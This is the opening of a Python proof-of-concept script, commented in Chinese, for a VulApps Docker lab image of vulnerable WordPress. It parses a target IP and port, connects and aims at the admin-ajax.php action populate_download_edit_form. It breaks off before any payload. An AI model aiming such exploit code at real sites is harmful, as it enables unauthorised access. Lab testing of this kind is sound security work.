#!/usr/bin/env python
# -*- coding: utf-8 -*-
# python version 3.6.4
# 简介：
# 脚本适用于docker下的vulapps环境，使用
# docker run -d -p 80:80 medicean/vulapps:w_wordpress_1
# 可直接运行。
# 具体信息参见github地址
# https://github.com/Medicean/VulApps/tree/master/w/wordpress/1

import sys
import traceback
import http.client
import urllib.parse

argc = len(sys.argv) - 1
argv = sys.argv[1:]
if argc == -1 or argc > 2:
    print("用法：python",sys.argv[0],"IP地址 端口号")
    print("例如：url为http://127.0.0.1:8080/，则IP地址应为127.0.0.1，端口号应为8080")
    sys.exit()

ip = "192.168.13.129"
port = 80

if argc >= 1:
    ip = argv[0]
if argc == 2:
    port = argv[1]

try:
    conn = http.client.HTTPConnection(ip, port)
except http.client.HTTPException as e:
    print(repr(e))
    traceback.print_exc()

try:
    url = "/wp-admin/admin-ajax.php?action=populate_download_edit_form"
    header
    